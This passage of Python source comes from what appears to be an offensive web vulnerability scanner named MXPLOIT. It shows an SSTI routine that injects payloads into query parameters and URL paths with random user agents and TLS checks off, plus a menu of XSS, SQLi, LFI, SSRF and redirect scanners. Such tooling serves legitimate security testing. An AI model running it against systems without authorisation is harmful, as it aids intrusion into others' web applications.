    clear_screen()
    display_ssti_banner()
    
    urls = prompt_for_urls()
    payloads = prompt_for_payloads("ssti_payloads.txt", "SSTI")
    
    vulnerable_urls = []
    total_scanned = 0
    start_time = time.time()
    
    try:
        session = get_retry_session()
        
        for url in urls:
            print(f"\n{Color.YELLOW}[*] Scanning URL: {url}{Color.RESET}")
            for payload in payloads:
                result = scan_ssti(url, payload, session)
                total_scanned += 1
                if result:
                    vulnerable_urls.append(result)
    
    except KeyboardInterrupt:
        print(f"\n{Color.RED}[!] Scan interrupted by user{Color.RESET}")
    
    print_scan_summary(len(vulnerable_urls), total_scanned, start_time)
    save_results(vulnerable_urls, "SSTI")
    press_enter_to_continue()

def scan_ssti(url, payload, session):
    """Scan a single URL for SSTI vulnerabilities"""
    headers = {'User-Agent': get_random_user_agent()}
    parsed = urllib.parse.urlparse(url)
    
    # Test in query parameters
    if parsed.query:
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        for param in params:
            modified_params = params.copy()
            modified_params[param] = [payload]
            test_url = urllib.parse.urlunparse(
                parsed._replace(
                    query=urllib.parse.urlencode(modified_params, doseq=True)
                )
            )
            
            print(f"{Color.WHITE}[→] Testing: {param}={payload}{Color.RESET}")
            
            try:
                response = session.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Check if the response contains the evaluated payload
                if "49" in response.text and ("7*7" in payload or "7*7" in response.text):
                    print(f"{Color.GREEN}[✓] Potential SSTI Found: {test_url}{Color.RESET}")
                    return test_url
                
                print(f"{Color.RED}[✗] No SSTI: {param}{Color.RESET}")
                
            except Exception as e:
                print(f"{Color.RED}[!] Error testing {test_url}: {str(e)}{Color.RESET}")
    
    # Also test in path
    test_url = urllib.parse.urlunparse(parsed._replace(path=payload))
    print(f"{Color.WHITE}[→] Testing path: {payload}{Color.RESET}")
    
    try:
        response = session.get(test_url, headers=headers, timeout=10, verify=False)
        
        if "49" in response.text and ("7*7" in payload or "7*7" in response.text):
            print(f"{Color.GREEN}[✓] Potential SSTI Found: {test_url}{Color.RESET}")
            return test_url
        
        print(f"{Color.RED}[✗] No SSTI in path{Color.RESET}")
        
    except Exception as e:
        print(f"{Color.RED}[!] Error testing {test_url}: {str(e)}{Color.RESET}")
    
    return None

def main():
    """Main program loop"""
    clear_screen()
    display_banner()
    
    while True:
        display_menu()
        choice = input(f"\n{Color.CYAN}[?] Select an option (1-7): {Color.RESET}").strip()
        
        if choice == '1':
            run_xss_scanner()
        elif choice == '2':
            run_sqli_scanner()
        elif choice == '3':
            run_or_scanner()
        elif choice == '4':
            run_lfi_scanner()
        elif choice == '5':
            run_ssrf_scanner()
        elif choice == '6':
            run_ssti_scanner()
        elif choice == '7':
            print(f"\n{Color.YELLOW}[*] Exiting MXPLOIT...{Color.RESET}")
            sys.exit(0)
        else:
            print(f"\n{Color.RED}[!] Invalid option. Please try again.{Color.RESET}")
            press_enter_to_continue()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Color.RED}[!] Program terminated by user{Color.RESET}")
        sys.exit(0)
